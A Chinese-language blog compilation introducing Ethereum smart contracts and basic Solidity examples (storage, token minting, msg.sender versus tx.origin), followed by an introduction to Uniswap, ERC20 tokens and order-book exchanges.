<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/152590">Solidity中的delegatecall杂谈 - 安全客，安全资讯平台</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.bubbles966.cn/blog/2018/05/07/analyse_dapp_by_ethernaut_2/">从Ethernaut学习智能合约审计(二) - Bubbles~blog</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834">https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834</a></li>
</ol>
<h1 id="区块链技术14-智能合约和solidity简介"><a href="#区块链技术14-智能合约和solidity简介" class="headerlink" title="区块链技术14:智能合约和solidity简介"></a>区块链技术14:智能合约和solidity简介</h1><p>首先要强调的是，以太坊和比特币的区别。比特币主要用途是用于进行交易，定位是数字货币的支付功能。以太坊相比比特币是一个巨大的提升，将区块链的应用边界从货币和支付扩大到了更广的领域（通过智能合约实现）。</p>
<p>区块链2.0是更宏观的对整个市场去中心化，利用区块链技术来转换许多不同的数字资产，通过转让来创建不同资产的价值。区块链技术的去中心化账本功能可以被用来创建、确认、转移各种不同类型的资产及合约。几乎所有类型的金融交易都可以被改造成在区块链上使用，包括股票、私募股权、众筹、债券和其他类型的金融衍生品如期货、期权等。</p>
<p>那什么是智能合约呢？</p>
<p>智能合约不是一定要用区块链来实现，很久之前就已经出现了：比如微信和支付宝的信用卡自动还款，也是一种智能合约。当还款日到了，还款条件也满足（支付宝的余额宝、微信支付余额或者银行储蓄卡中余额充足），系统会自动进行还款，这些都是智能合约，也没有使用区块链技术。</p>
<p>而使用区块链的话，结合不可篡改数据无法删除、修改，只能新增，保证了历史的可追溯，同时作恶的成本将很高，因为其作恶行为将被永远记录，同时拥有高可靠性，用户不用担心系统在条件被满足时不执行合约；然后就是去中心化带来的全网备份，完备的记录完全可以支持支持事后的审计，避免了中心化因素的影响。所以可以想象，以太坊通过在区块链上提供了图灵完备语言，打开了多么大的一个市场。</p>
<p>举一个例子，看看以太坊上的应用：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233109.jpg" alt="img"></p>
<p>谜恋猫是世界首款区块链游戏。“区块链”是支持类似比特币这样的加密货币的运作技术基础。尽管谜恋猫不是数字货币，但它也能提供同样的安全保障：每一只谜恋猫都是独一无二的，而且100%归用户所有。它无法被复制、拿走、或销毁。</p>
<p>迷恋猫官方将他们设计的迷恋猫合约发布到了以太坊上，并公布了合约内容，其中规定了0代猫只能有他们的CEO、COO来产生，并限定的0代猫最多产生的数量，以及玩家之间如何交易猫，两只猫咪之间如何繁育、猫咪备孕周期等等规则，以上规则已经在以太坊上做了公证，以后只能按照这套规则来进行游戏。<br>在区块链平台上的每只猫咪其实只是存在以太坊中的一段猫咪基因编码，该段基因编码决定了猫咪的属性、外貌等，迷恋猫官方在以太坊之外，提供了一个网站，在网站上将这些猫咪根据其基因编码展示出来。玩家可以使用自己的以太坊帐户去购买这些猫咪，并将自己的猫咪去与其他玩家的猫咪繁育以产生下一代猫咪，或者继续将其拍卖，猫咪之间繁育之后产生的下一代猫咪，其基因编码是受其两只上一代猫咪基因编码影响的，由于猫咪的基因编码在以太坊上都是公开的，所以迷恋猫官方并未公布下一代基因编码的生成规则，这样玩家也无法人为的控制，使用两只特定基因的猫来繁育出具有特定稀有属性的下一代。 玩家在以太坊的帐户是由一段特殊的密钥保护的，玩家进行购买猫咪、繁育猫咪操作事，这些操作信息都会被发布到以太坊上时，并且这些操作行为都会使用玩家的密钥进行认证，并在以太坊上记录，其公之于众。所以所有人都可以看到玩家A买了一只猫咪Kitty101，玩家B将他的猫咪Kitty201与他的Kitty202进行了繁育，并生下了一只什么样基因的Kitty301。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233110.jpg" alt="img"></p>
<p>在此之后，区块链上发布了不少游戏，而今年暑假的两款游戏（Fomo3d和LastWinner）吸引了大量的眼球，同时也可能预示着在以太坊上游戏开发的没落。Fomo3d的黑客攻击技巧可以参看<a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">1</a>和<a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">2</a>。</p>
<p>那由此可以看到，比太币和以太坊底层框架本身，当前攻击较少；但是在以太坊上，智能合约本身的代码问题是安全的重灾区。</p>
<p>那接下来，我们讨论下，solodity语言，对智能合约有一个基本的了解。</p>
<p>我们使用在线的<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix IDE</a>来查看智能合约的效果。</p>
<p>首先看最基本的语法和使用情况。</p>
<ol>
<li>test_2.sol 最基本的用法</li>
</ol>
<p>以下的代码中，除了第一行和第二行中的contract，其实就和其他我们比较熟悉的语言差不多。将代码拷贝到remix之中，然后deploy到链上去，就是智能合约了。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract C &#123;</span><br><span class="line">    //交换传入值的顺序并返回</span><br><span class="line">    function f(uint key, uint value) returns (uint, uint)&#123; </span><br><span class="line">        return (value, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function g() public view returns (uint, uint)&#123;</span><br><span class="line">        //任意顺序的通过变量名来指定参数值</span><br><span class="line">        return f(&#123;value: 2, key: 1&#125;);//2,1</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function h() public view returns (uint)&#123;</span><br><span class="line">        uint a = 3;</span><br><span class="line">        uint b = 4;</span><br><span class="line">        return a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233111.jpg" alt="img"></p>
<p>第一行就是告诉大家源代码使用Solidity版本0.4.0写的，并且使用0.4.0以上版本运行也没问题（最高到0.5.0，但是不包含0.5.0）。这是为了确保合约不会在新的编译器版本中突然行为异常。关键字 <code>pragma</code> 的含义是，一般来说，pragmas（编译指令）是告知编译器如何处理源代码的指令的（例如， <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Pragma_once">pragma once</a> ）。</p>
<p>Solidity中合约的含义就是一组代码（它的 <em>函数</em> )和数据（它的 <em>状态</em> ），它们位于以太坊区块链的一个特定地址上。 </p>
<p>这个合约中有三个函数，f逆序返回参数中的两个值；g调用f；h计算两个数字的和。</p>
<ol start="2">
<li>存储</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line"></span><br><span class="line">    function set(uint x) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码行 <code>uint</code> <code>storedData;</code> 声明一个类型为 <code>uint</code> (256位无符号整数）的状态变量，叫做 <code>storedData</code> 。 你可以认为它是数据库里的一个位置，可以通过调用管理数据库代码的函数进行查询和变更。对于以太坊来说，上述的合约就是拥有合约（owning contract）。在这种情况下，函数 <code>set</code> 和 <code>get</code> 可以用来变更或取出变量的值。</p>
<p>要访问一个状态变量，并不需要像 <code>this.</code> 这样的前缀，虽然这是其他语言常见的做法。</p>
<p>该合约能完成的事情并不多（由于以太坊构建的基础架构的原因）：它能允许任何人在合约中存储一个单独的数字，并且这个数字可以被世界上任何人访问，且没有可行的办法阻止你发布这个数字。当然，任何人都可以再次调用 <code>set</code> ，传入不同的值，覆盖你的数字，但是这个数字仍会被存储在区块链的历史记录中。随后，我们会看到怎样施加访问限制，以确保只有你才能改变这个数字。</p>
<ol start="3">
<li>以上是单个合约。那我们来试一下在不同的合约之中进行交互。(test_<em>send.sol和simple_set.sol</em>)</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">//import &#x27;test_send.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line">    function set(uint x) public&#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line">    function get() public constant returns (uint retVal) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleSet &#123;</span><br><span class="line"></span><br><span class="line">	address instance_address = 0x9351ca1b4cc9c3d11db77374de3987b5abf3d4c8;</span><br><span class="line">	SimpleStorage target = SimpleStorage(instance_address);</span><br><span class="line">    uint readData;</span><br><span class="line">	</span><br><span class="line">    function read() public view returns (uint) &#123;</span><br><span class="line">        readData = target.get();</span><br><span class="line">		return readData;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    function write(uint x) &#123;</span><br><span class="line">        target.set(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在simple_set中，可以调用并修改另外一个合约中的数据。下图展示的是先通过simple_set修改storeData的值，然后在simpleStorage中去读取，结果显示了变化。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233112.jpg" alt="img"></p>
<ol start="4">
<li>铸币(coin_mint.sol)</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line"></span><br><span class="line">//关键字“public”使变量能从合约外部访问。</span><br><span class="line">    address public minter;</span><br><span class="line">    mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">//事件让轻客户端能高效的对变化做出反应。</span><br><span class="line">    event Sent(address from, address to, uint amount);</span><br><span class="line"></span><br><span class="line">//这个构造函数的代码仅仅只在合约创建的时候被运行。</span><br><span class="line">    function Coin() &#123;</span><br><span class="line">        minter = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function mint(address receiver, uint amount) &#123;</span><br><span class="line">        if (msg.sender != minter) return;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">    function send(address receiver, uint amount) &#123;</span><br><span class="line">        if (balances[msg.sender] &lt; amount) return;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">        Sent(msg.sender, receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个合约引入了一些新的概念，让我们逐一解读。</p>
<p><code>address</code> <code>public</code> <code>minter;</code> 这一行声明了一个可以被公开访问的 <code>address</code> 类型的状态变量。 <code>address</code> 类型是一个160位的值，且不允许任何算数操作。这种类型适合存储合约地址或外部人员的密钥对。关键字 <code>public</code> 自动生成一个函数，允许你在这个合约之外访问这个状态变量的当前值。如果没有这个关键字，其他的合约没有办法访问这个变量。由编译器生成的函数的代码大致如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">function minter() returns (address) &#123; return minter; &#125;</span><br></pre></td></tr></table></figure>

<p>当然，加一个和上面完全一样的函数是行不通的，因为我们会有同名的一个函数和一个变量，这里，主要是希望你能明白——编译器已经帮你实现了。</p>
<p>下一行， </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">mapping (address =&gt; uint) public balances; </span><br></pre></td></tr></table></figure>

<p>也创建一个公共状态变量，但它是一个更复杂的数据类型。 该类型将address映射为无符号整数。 Mappings 可以看作是一个 <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hash_table">哈希表</a> 它会执行虚拟初始化，以使所有可能存在的键都映射到一个字节表示为全零的值。 但是，这种类比并不太恰当，因为它既不能获得映射的所有键的列表，也不能获得所有值的列表。 因此，要么记住你添加到mapping中的数据（使用列表或更高级的数据类型会更好），要么在不需要键列表或值列表的上下文中使用它，就如本例。 而由 <code>public</code> 关键字创建的getter函数 <a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/contracts.html%23getter-functions">getter function</a> 则是更复杂一些的情况， 它大致如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">function balances(address _account) public view returns (uint) &#123; return balances[_account]; &#125;</span><br></pre></td></tr></table></figure>

<p>正如你所看到的，你可以通过该函数轻松地查询到账户的余额。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">event Sent(address from, address to, uint amount); </span><br></pre></td></tr></table></figure>

<p>这行声明了一个所谓的“事件（event）”，它会在 <code>send</code> 函数的最后一行被发出。用户界面（当然也包括服务器应用程序）可以监听区块链上正在发送的事件，而不会花费太多成本。一旦它被发出，监听该事件的listener都将收到通知。而所有的事件都包含了 <code>from</code> ， <code>to</code> 和 <code>amount</code> 三个参数，可方便追踪事务。 为了监听这个事件，你可以使用如下代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Coin.Sent().watch(&#123;&#125;, &#x27;&#x27;, function(error, result) &#123;</span><br><span class="line">    if (!error) &#123;</span><br><span class="line">        console.log(&quot;Coin transfer: &quot; + result.args.amount +</span><br><span class="line">            &quot; coins were sent from &quot; + result.args.from +</span><br><span class="line">            &quot; to &quot; + result.args.to + &quot;.&quot;);</span><br><span class="line">        console.log(&quot;Balances now:\n&quot; +</span><br><span class="line">            &quot;Sender: &quot; + Coin.balances.call(result.args.from) +</span><br><span class="line">            &quot;Receiver: &quot; + Coin.balances.call(result.args.to));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里请注意自动生成的 <code>balances</code> 函数是如何从用户界面调用的。</p>
<p>特殊函数 <code>Coin</code> 是在创建合约期间运行的构造函数，不能在事后调用。 它永久存储创建合约的人的地址: <code>msg</code> (以及 <code>tx</code> 和 <code>block</code> ) 是一个神奇的全局变量，其中包含一些允许访问区块链的属性。 <code>msg.sender</code> 始终是当前（外部）函数调用的来源地址。</p>
<p>最后，真正被用户或其他合约所调用的，以完成本合约功能的方法是 <code>mint</code> 和 <code>send</code>。 如果 <code>mint</code> 被合约创建者外的其他人调用则什么也不会发生。 另一方面， <code>send</code> 函数可被任何人用于向他人发送币 (当然，前提是发送者拥有这些币)。记住，如果你使用合约发送币给一个地址，当你在区块链浏览器上查看该地址时是看不到任何相关信息的。因为，实际上你发送币和更改余额的信息仅仅存储在特定合约的数据存储器中。通过使用事件，你可以非常简单地为你的新币创建一个“区块链浏览器”来追踪交易和余额。</p>
<p>这份合约进行操作，譬如通过账户7578C将合约部署到链上，那么可以查看合约的minter；minter可以自己铸币，相当于是发给任何用户一些币；有币的用户又可以进行转账。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233113.jpg" alt="img"></p>
<ol start="5">
<li>复杂的数据类型 （origin_send.sol）</li>
</ol>
<p>msg.sender和tx.origin</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tx.origin</code>是一个address类型，表示交易的发送者，<code>msg.sender</code>则表示为消息的发送者。在同一个合约中，他们是等价的。但是在不同合约中，<code>tx.origin</code>表示用户地址，<code>msg.sender</code>则表示合约地址。</p>
<p>上述代码中有两个合约，需要分别部署。并且demo2在部署时需要传入参数。</p>
<p>在demo中:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233115.jpg" alt="img"></p>
<p>在demo2中，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233116.jpg" alt="img"></p>
<p>而下面的地址7578就是demo合约部署的地址，7D5b就是demo2合约部署的地址。</p>
<p>使用<code>msg.sender</code>的所有者可能是一个合约。</p>
<p>使用<code>tx.origin</code>的所有者永远不可能是合约。</p>
<p>在简单的调用链A-&gt; B-&gt; C-&gt; D中，内部D 的<code>msg.sender</code>为C，<code>tx.origin</code>为A.</p>
<p>就灵活性而言首选<code>msg.sender</code>。此外，对于Serenity，Vitalik建议避免使用tx.origin：<a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof">How do I make my DAPP “Serenity-Proof?”</a></p>
<p>如果你真的需要使用<code>tx.origin</code>，请一定考虑仔细。请记住，你可能不是该合约的唯一用户。其他人也可能想要使用你的合约，并希望通过他们编写的合约与之进行互动。</p>
<p>如果在D中确实需要其来源<code>origin</code>，那么合约B，C，D中的每个函数都可以采用额外的参数来传播来源：A将其地址（<code>this</code>）传递给B，B将值传递给C ，C将它传递给D.</p>
<p>可以查看参考5， 讨论使用tx.origin可能会引起的攻击。</p>
<p>接下来看一下address。</p>
<p>以太坊中的地址的长度为<code>20</code>字节，一字节等于8位，一共<code>160</code>位，所以<code>address</code>其实亦可以用<code>uint160</code>来声明。</p>
<p>属性：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.balance, 地址的余额（单位为：wei）</span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.transfer,发送以太币（单位为：wei）到一个地址，如果失败会停止并抛出异常。</span><br></pre></td></tr></table></figure>









<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">Fomo3D 千万大奖获得者“特殊攻击技巧”最全揭露 - 华尔街见闻</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">“首次深度揭秘”Fomo3D，被黑客拿走的2200万！</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html">https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/b8bb006a5b68">https://www.jianshu.com/p/b8bb006a5b68</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_34611579/article/details/85163326">https://blog.csdn.net/qq_34611579&#x2F;article&#x2F;details&#x2F;85163326</a></li>
</ol>
<h1 id="区块链技术15-uniswap简介"><a href="#区块链技术15-uniswap简介" class="headerlink" title="区块链技术15:uniswap简介"></a>区块链技术15:uniswap简介</h1><p>为吸引注意力，先看一个数据：</p>
<p>从2020年3月1日到3月25日，Uniswap上的总交易规模大约2.06亿美元，这期间流动性提供商大约捕获了60多万美元的费用价值。其中3月12日和3月13日交易量都超过3,000万美元，贡献三分之一的收益，平均下来，每天大约可以产出24,000美元的收益。假设这是日均的费用，那么，所有流动性提供商一年可以赚取876万美元收益。</p>
<hr>
<p>Uniswap是一种基于以太坊的协议，旨在促进ETH和ERC20 代币数字资产之间的自动兑换交易。</p>
<p>首先讨论下，第一，以太坊上可以挖出以太币eth，人们出于各种投资&#x2F;部署以太坊智能合约&#x2F;运行智能合约，会用现实中的钱去购买以太币。第二，以太坊上还有很多种代币，以太坊代币是内置在以太坊区块链上的数字资产。它们受益于以太坊现有的基础设施，而不需要开发者重新构建全新区块链。它们还通过以太币（以太坊的本地货币，被用来驱动智能合约）来加强以太坊生态系统。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233117.jpg" alt="img"></p>
<p>利用以太坊的智能合约可以轻松编写出属于自己的代币，代币可以代表任何可以交易的东西，如：积分、财产、证书等等。因此不管是出于商业，还是学习的目的，很多人想创建一个自己的代币，看看创建的代币是什么样子。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233118.jpg" alt="img"></p>
<p>ERC20 Token</p>
<p>ERC20 和代币经常一同出现， ERC20 是以太坊定义的一个代币标准。定义了在实现代币的时候必须要遵守的协议，如指定代币名称、总量、实现代币交易函数等，只有支持了协议才能被以太坊钱包支持。<br>其接口如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract ERC20Interface &#123;</span><br><span class="line"></span><br><span class="line">    string public constant name = &quot;Token Name&quot;;</span><br><span class="line">    string public constant symbol = &quot;SYM&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;  // 18 is the most common number of decimal places</span><br><span class="line"></span><br><span class="line">    function totalSupply() public constant returns (uint);</span><br><span class="line">    function balanceOf(address tokenOwner) public constant returns (uint balance);</span><br><span class="line">    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);</span><br><span class="line">    function transfer(address to, uint tokens) public returns (bool success);</span><br><span class="line">    function approve(address spender, uint tokens) public returns (bool success);</span><br><span class="line">    function transferFrom(address from, address to, uint tokens) public returns (bool success);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint tokens);</span><br><span class="line">    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说明一下：<br>name ： 代币名称<br>symbol： 代币符号<br>decimals： 代币小数点位数，代币的最小单位， 18 表示我们可以拥有 .0000000000000000001 单位个代币。<br>totalSupply() : 发行代币总量。<br>balanceOf(): 查看对应账号的代币余额。<br>transfer(): 实现代币转账交易，用于给用户发送代币（从我们的账户里）。<br>transferFrom(): 给被授权的用户使用，他可以从我们（参数 from）的账户里发送代币给其他用户（参数 to）。<br>allowance(): 返回授权花费的代币数。<br>approve(): 授权用户可代表我们花费的代币数。</p>
<p>那么为什么会出现uniswap这样的协议来支持ETH和各种代币进行自动兑换呢？</p>
<p>举一个兑换外币的例子，兑换外币有可能是出国&#x2F;购物需要使用，也有可能出于获利的目的。比如2018年4月份人民币汇率是6.3，也即可以用630元兑换100美元。到2019年10月人民币汇率是7.1，可以用手中的100美元兑换710元人民币，相当于就赚了70元人民币。也即，2018年4月用人民币买美元，2019年10月再用美元买人民币，进行两种货币之间的交换。相反，如果到2020年5月人民币又跌回了6.3，那么在2019年的时候用100美元买到710人民币，然后在2020年的时候把710人民币换成113美元，就赚到了13美元。</p>
<p>这就是两种货币交易的例子。这种交易可以发生在银行或者交易所。虽然国内银行规定进行购汇的时候不需要任何手续费，但是把外汇货币卖给银行，会按银行的“买入价”计算，从银行买外汇，则按银行规定的“卖出价”算。当中存在一个差价，这个差价相当于银行的手续费。交易所的三个经典设计模型是订单簿模型、自动化做市模型和荷兰式拍卖模型。这里还有一些概念，如订单簿、挂单、限价委托等等。</p>
<p>在中心化交易所中，手续费相对盈利而言，一般不低，因此，当区块链出现之后，去中心化交易所（DEX）正在成为一种新的解决方案。2019年时，已有了不少基于区块链的去中心化交易所，不少的去中心化交易所都是基于订单簿。订单簿包含了代币的买单和卖单列表。买单称为出价（bid），卖单称为要价（ask）。订单簿列出了在每个价格点出价或要价的代币数量。最高出价（买一）和最低要价（卖一）被称作买卖一（top of the book）。它们标志着市场情绪以及获得订单所需的买入价和卖出价。最高出价和最低要价之间的差异叫价差（spread）。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233119.jpg" alt="img"></p>
<p><em>DDEX 的订单簿</em></p>
<p>目前，IDEX、DDEX、Radar Relay、EtherDelta、Paradex 和 Ethfinex 都是订单簿式 DEX。在订单簿式去中心化交易所（以下简称订单簿式 DEX）中，可以提交两种类型的订单：市价订单和限价订单。</p>
<p>提交市价订单时，可以设定买入&#x2F;卖出的代币数量，DEX 会立即以最优市场价执行你的市价单。下一个市价单意味着，优先保证订单成交速度，无论订单簿上现有订单价格是多少。执行市价单的方式是，为买家匹配现有的卖一订单，为卖家匹配现有的买一订单。</p>
<p>提交限价订单时，DEX 会以设定的价格和数量买入或卖出代币，如果当前没有能与之匹配的订单，则该订单会被挂在订单簿上，等待交易。</p>
<p>订单簿可以存储在链上或链下。链下的订单簿式交易所（例如 0x）需要 Relayer （指的是采用此交易协议的 DEX）将订单簿存储在中心化服务器上。而链上的订单簿式交易所不需要中心化服务器，但用户需要自己创建交易并为挂单和取消订单的操作支付 gas 费用，即使订单没有被成交，gas 费也无法退还。</p>
<p>在订单簿式交易所中，做市商通过挂单来提供流动性，这些订单可以减少价差并补偿库存风险。通常，交易量越低，价差越大，因为做市商承担的流动性匮乏的风险更大。</p>
<p><em>优点</em></p>
<p>适合流动性市场。一个订单簿交易所的交易量越大、价差越小，证明一个交易所的流动性越好。在高流动性市场中，订单簿式交易所最适合于显示市场价格，并且大额订单不受价格滑点影响。Coinbase 和币安等大型中心化交易所、以及纽约证券交易所等传统交易所都依赖于订单簿模式。</p>
<p><em>缺点</em></p>
<p>不适合缺乏流动性的市场。只有当出价和要价相匹配时，订单才会被完成，反之亦然；如果订单的最高出价仍然低于最低要价，那么将无法进行交易。因此，对于流动性不足的市场，订单簿交易所将导致大额差价，交易成功率低，而且小量资金即可对市场价格造成巨大影响。</p>
<p>矿工抢先交易 (front-running)。部分链上订单簿式交易所面临着矿工与交易者之间的抢先交易问题。</p>
<p>矿工可以在交易被区块打包之前就看到所有交易。如果你下了一个大买单，一旦矿工看到这个订单，他们发现你的订单已经大到足以拉高代币价格，那么矿工便可以自己创建一个买单并把自己的买单在你之前添加到区块中。当这个区块被挖出，相当于这个矿工低价买入了代币，然后代币价格被大单拉高。矿工再高价卖出这个代币，就能无风险套利。</p>
<hr>
<p>Uniswap是DeFi中最著名的协议之一，完全部署在链上，任何个人用户，只要安装了去中心化钱包软件（当前已经支持的钱包包括 MetaMask、WalletConnect、Coinbase Wallet、Fortmatic、Portis），都可以使用这个协议。Uniswap协议的设计结构体系与传统数字资产交易所中的交易模型完全不同。大多数传统交易所都是通过维护一个“订单簿”，来匹配一种数字资产的买卖双方。Uniswap则是利用储备金流动性来实现协议上的数字资产交易兑换。Uniswap本质是一个自动化做市商（AMM），它舍弃了传统订单薄的撮合方式，采用流动池加恒定乘积公式算法(x*y &#x3D; k )为不同加密资产提供即时报价和兑换服务。 </p>
<p><strong>什么是Uniswap</strong></p>
<p>关于什么是Uniswap，先看一下Uniswap白皮书中的定义：</p>
<p>Uniswap is a protocol for automated token exchange on Ethereum. It is designed around ease-of-use, gas efficiency, censorship resistance, and zero rent extraction. </p>
<p>Uniswap是一个基于以太坊的自动代币交换协议，它的设计目标是：易用性、gas高利用率、抗审查性和零抽租。 </p>
<ul>
<li><p>ease-of-use（易用性）：Token A换Token B，在Uniswap也只要发出一笔交易就能完成兑换，在其它交易所中可能需要发两笔交易：第一笔将Token A换成某种媒介货币，如ETH, D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a> 等，然后再发第二笔交易换成Token B。 </p>
</li>
<li><p>gas efficiency（gas高利用率）：在Uniswap上消耗的gas量是以太坊上的几家主流去中化交易所中最低的，也就代表在Uniswap交易要付的矿工费最少。</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233120.jpg" alt="img"></p>
<ul>
<li>censorship resistance（抗审查性）：抗审查性体现在Uniswap上架新Token没有门槛，任何人都能在Uniswap上架任何Token。这在去中心交易所中很少见，虽然大多数的去中心化交易所不会像中心化交易所收取上币费，但还是需要提交上币申请，通过审查后运营团队才会让Token可以在他们的交易所上交易。下面是各去中心化交易所上币规则的详情：</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">KyberSwap上币规则：https://developer.kyber.network/docs/Reserves-ListingProcess/</span><br><span class="line">EtherDelta上币规则：https://steemit.com/cryptocurrency/@mindseye69/new-etherdelta-coin-listing-rules</span><br><span class="line">IDEX上币规则：https://medium.com/@forrestwhaling/idex-token-listing-guidelines-eae00785fdd2</span><br><span class="line">Uniswap上币规则：https://uniswap.org/docs/v1/frontend-integration/token-listing/</span><br></pre></td></tr></table></figure>

<ul>
<li>zero rent extraction（零抽租）:在Uniswap协议设计中，开发团队不会从交易中抽取费用，交易中的所有费用都归还给流动性提供者。</li>
</ul>
<p>上面的介绍中又有两个新名词：AMM automated market maker，自动化做市商；流动性提供者。</p>
<h2 id="自动化做市商-AMM"><a href="#自动化做市商-AMM" class="headerlink" title="自动化做市商(AMM)"></a>自动化做市商(AMM)</h2><p>传统的交易所有一个订单薄(Order Book)，订单薄上记录着买卖方向，数量和出价，交易所负责对买卖双方进行配对，一旦订单薄中最高价格低于或等于最低价格，就会促成交易，同时会产生一个新的成交价，传统交易所有以下特点：</p>
<ul>
<li>市场上必须要有用户进行挂单，要有一定量的订单（市场流动）。</li>
<li>订单必须重叠才能成交，即买价高于或等于卖价。</li>
<li>需要将资产存储在交易所。</li>
</ul>
